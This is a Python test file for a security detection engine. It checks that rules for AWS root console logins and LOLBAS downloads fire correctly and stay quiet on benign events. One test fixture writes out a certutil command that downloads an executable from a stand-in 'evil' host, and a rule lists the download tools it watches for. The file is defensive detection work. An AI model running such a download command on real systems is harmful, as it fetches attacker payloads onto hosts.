"""Phase A2 — live detection-engine tests.

Proves the engine loads the exported ruleset, recovers the connector-normalized
fields from ``ocsf_event["raw_data"]``, fires the right rules, builds a RawAlert
with the rule's severity/MITRE, and stays quiet on benign near-misses.
"""

from __future__ import annotations

import json

from app.models.alert import AlertSeverity
from app.services.detection_engine import DetectionEngine

TENANT = "11111111-1111-1111-1111-111111111111"

# A tiny hand-built ruleset so the tests don't depend on corpus churn.
_RULES = [
    {
        "id": "det-cloud-001",
        "slug": "aws-root-login",
        "name": "AWS Root Account Console Login",
        "severity": "critical",
        "category": "cloud",
        "product": "aws",
        "service": "cloudtrail",
        "mitre": ["T1078.004"],
        "match_when": {"event_name": "ConsoleLogin", "user_type": "Root", "error_code": None},
    },
    {
        "id": "det-endpoint-001",
        "slug": "lolbas",
        "name": "LOLBAS Download",
        "severity": "high",
        "category": "endpoint",
        "product": "edr",
        "service": "process-create",
        "mitre": ["T1218"],
        "match_when": {
            "image_basename_in": ["certutil.exe", "regsvr32.exe"],
            "command_line_contains_any": ["http", "downloadfile"],
        },
    },
]


def _msg(raw_fields: dict, *, product: str = "aws") -> dict:
    return {
        "id": "22222222-2222-2222-2222-222222222222",
        "tenant_id": TENANT,
        "ocsf_event": {
            "metadata": {"product": {"name": product}},
            "device": {"name": "HOST-1"},
            "actor": {"user": {"name": "someuser"}},
            "raw_data": json.dumps(raw_fields),
        },
    }


def _engine() -> DetectionEngine:
    return DetectionEngine(rules=_RULES)


def test_positive_event_fires_matching_rule():
    eng = _engine()
    hits = eng.evaluate(_msg({"event_name": "ConsoleLogin", "user_type": "Root", "error_code": None}, product="aws"))
    ids = {h.rule_id for h in hits}
    assert "det-cloud-001" in ids


def test_benign_near_miss_does_not_fire():
    eng = _engine()
    hits = eng.evaluate(_msg({"event_name": "ConsoleLogin", "user_type": "IAMUser", "error_code": None}, product="aws"))
    assert all(h.rule_id != "det-cloud-001" for h in hits)


def test_endpoint_rule_fires_on_recovered_raw_fields():
    eng = _engine()
    msg = _msg(
        {"image_basename": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://evil/p.exe"},
        product="edr",
    )
    hits = eng.evaluate(msg)
    assert any(h.rule_id == "det-endpoint-001" for h in hits)


def test_build_alert_carries_rule_metadata():
    eng = _engine()
    msg = _msg({"event_name": "ConsoleLogin", "user_type": "Root", "error_code": None}, product="aws")
    hit = next(h for h in eng.evaluate(msg) if h.rule_id == "det-cloud-001")
    alert = eng.build_alert(msg, hit)
    assert alert is not None
    assert alert.severity == AlertSeverity.CRITICAL
    assert alert.title == "AWS Root Account Console Login"
    assert alert.source == "detection:det-cloud-001"
    assert "T1078.004" in alert.mitre_techniques
    assert alert.hostname == "HOST-1"


def test_no_ocsf_or_bad_tenant_is_safe():
    eng = _engine()
    assert eng.evaluate({"tenant_id": TENANT}) == []
    msg = _msg({"event_name": "ConsoleLogin", "user_type": "Root", "error_code": None})
    msg["tenant_id"] = "not-a-uuid"
    msg["ocsf_event"].pop("tenant_uid", None)
    hit = eng.evaluate(msg)[0]
    assert eng.build_alert(msg, hit) is None  # bad tenant -> no alert


def test_falls_back_to_ocsf_when_no_raw_data():
    eng = _engine()
    msg = {
        "tenant_id": TENANT,
        "ocsf_event": {"event_name": "ConsoleLogin", "user_type": "Root", "error_code": None, "metadata": {"product": {"name": "aws"}}},
    }
    hits = eng.evaluate(msg)
    assert any(h.rule_id == "det-cloud-001" for h in hits)


def test_real_ruleset_loads_and_is_nonempty():
    eng = DetectionEngine()
    assert eng.rule_count > 500  # the exported corpus (~817)
